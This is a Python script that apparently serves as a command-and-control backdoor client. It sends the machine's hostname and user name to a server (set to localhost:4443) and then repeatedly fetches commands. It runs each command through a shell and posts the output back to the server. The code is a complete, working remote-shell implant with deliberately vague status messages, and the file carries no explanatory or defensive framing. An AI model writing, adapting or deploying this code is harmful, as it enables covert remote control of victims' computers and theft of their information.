import http.client
import socket
import time
import subprocess
import json
import os

HOST = "localhost"
PORT = 4443

def send_data_to_c2(data, path, headers=None):
    try:
        conn = http.client.HTTPConnection(HOST, PORT)
        conn.request("POST", path, data.encode('utf-8'))
        response = conn.getresponse()
        print(f"[{time.ctime()}] Operation completed. Status: {response.status}")
        conn.close()
        return response.status
    except (http.client.HTTPException, socket.error) as e:
        print(f"[{time.ctime()}] Operation failed")
        return None

def fetch_command(path="/loopback"):
    try:
        conn = http.client.HTTPConnection(HOST, PORT)
        conn.request("POST", path)
        response = conn.getresponse()
        if response.status == 200:
            command_data = json.loads(response.read().decode())
            conn.close()
            return command_data.get("command")
        else:
            conn.close()
            return None
    except (http.client.HTTPException, socket.error, json.JSONDecodeError) as e:
        print("Loopback failed.")
        return None

def execute_command(cmd):
    try:
        proc = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL,
            text=True
        )
        output, _ = proc.communicate(timeout=10)
        return output or ""
    except Exception:
        return ""

def main():
    initial_info = f"Hostname: {socket.gethostname()}, User: {os.getlogin()}"
    send_data_to_c2(initial_info, "/login")

    while True:
        command_to_execute = fetch_command()

        if command_to_execute:
            command_to_execute = command_to_execute.strip()
            if command_to_execute:
                if command_to_execute.lower() == "exit":
                    break
                
                command_output = execute_command(command_to_execute)

                send_data_to_c2(f"'{command_to_execute}':\n{command_output}", "/register")
            else:
                print(f"[{time.ctime()}] Empty.")
        else:
            print(f"[{time.ctime()}] Nothing occurred.")

        time.sleep(5)

if __name__ == "__main__":
    main()